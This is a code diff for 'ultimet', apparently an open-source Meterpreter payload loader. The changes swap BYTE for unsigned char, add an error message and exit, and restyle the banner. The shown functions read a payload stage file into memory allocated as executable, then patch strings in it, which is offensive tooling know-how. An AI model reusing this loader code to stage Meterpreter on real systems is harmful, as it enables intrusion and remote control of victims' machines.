@@ -26,14 +26,15 @@ LONGLONG SizeFromName(LPCWSTR szFileName) // Returns a file's size from its file
 	return fileSize.QuadPart; //LARGE_INTEGER is a sruct, QuadPart is the filesize in a 64bit digit... which should cover all file sizes "That's for files >4GB" 
 } 
 
-DWORD CopyStageToBuffer(LPCWSTR szFileName, BYTE** buffer)
+DWORD CopyStageToBuffer(LPCWSTR szFileName, unsigned char** buffer)
 {
 	// get file size...
 	DWORD size = 0;
 	size = (DWORD)SizeFromName(szFileName);
 	if (size == -1)
 	{
-		return -1;
+		dprintf(L"[-] Something went wrong getting size of file: \"%s\".\n", szFileName);
+		exit(0);
 	}
 	else {
 		dprintf(L"[*] Size of \"%s\" is \"%d\" bytes.\n", szFileName, size);
@@ -41,7 +42,7 @@ DWORD CopyStageToBuffer(LPCWSTR szFileName, BYTE** buffer)
 
 	// Allocate memory ...
 	dprintf(L"[*] Trying to VirtualAlloc \"%d + 5\" bytes of data\n", size);
-	*buffer = (BYTE*)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	*buffer = (unsigned char*)VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (buffer == NULL)
 	{
 		err = GetLastError();
@@ -72,7 +73,7 @@ DWORD CopyStageToBuffer(LPCWSTR szFileName, BYTE** buffer)
 	return ((DWORD)size + 5); 
 }
 
-int PatchString(BYTE* buffer, const wchar_t* replacement, const int index, const int NoOfBytes)
+int PatchString(unsigned char* buffer, const wchar_t* replacement, const int index, const int NoOfBytes)
 {
 	int counter = 0;
 	for(int i = index; i < (index + NoOfBytes); i++)
@@ -83,7 +84,7 @@ int PatchString(BYTE* buffer, const wchar_t* replacement, const int index, const
 	return 0;
 }
 
-DWORD binstrstr(BYTE * buff1, int lenbuff1, BYTE * buff2, int lenbuff2)  // shamelessly ripped from http://forums.devshed.com/c-programming-42/binary-strstr-395935.html , thanks "AlejandroVarela"
+DWORD binstrstr(unsigned char * buff1, int lenbuff1, unsigned char * buff2, int lenbuff2)  // shamelessly ripped from http://forums.devshed.com/c-programming-42/binary-strstr-395935.html , thanks "AlejandroVarela"
 { 
 	if (! buff1)                return FALSE; 
 	if (! buff2)                return FALSE; 
@@ -122,12 +123,11 @@ bool UnicodeToAnsi(char* ascii, const wchar_t* unicode)
 
 void print_awesome_header()
 {
-printf("*************************************************\n");
-printf("*\t[ultimet v0.1 pre-alpha]\t\t*\n");
-printf("*\tThe Ultimate Meterpreter Executable\t*\n");
-printf("*************************************************\n");
-printf("- @SheriefEldeeb\n");
-printf("- http://eldeeb.net\n");
-printf("- Made in Egypt :)\n");
-printf("*************************************************\n\n");
+printf("\n\n****************************************************\n");
+printf(" [+] [ultimet] - The Ultimate Meterpreter Executable\n");
+printf(" [+] v0.1 pre-alpha\n");
+printf("****************************************************\n");
+printf("  -  http://eldeeb.net - @SheriefEldeeb\n");
+printf("  -  Made in Egypt :)\n");
+printf("     ================\n\n");
 }
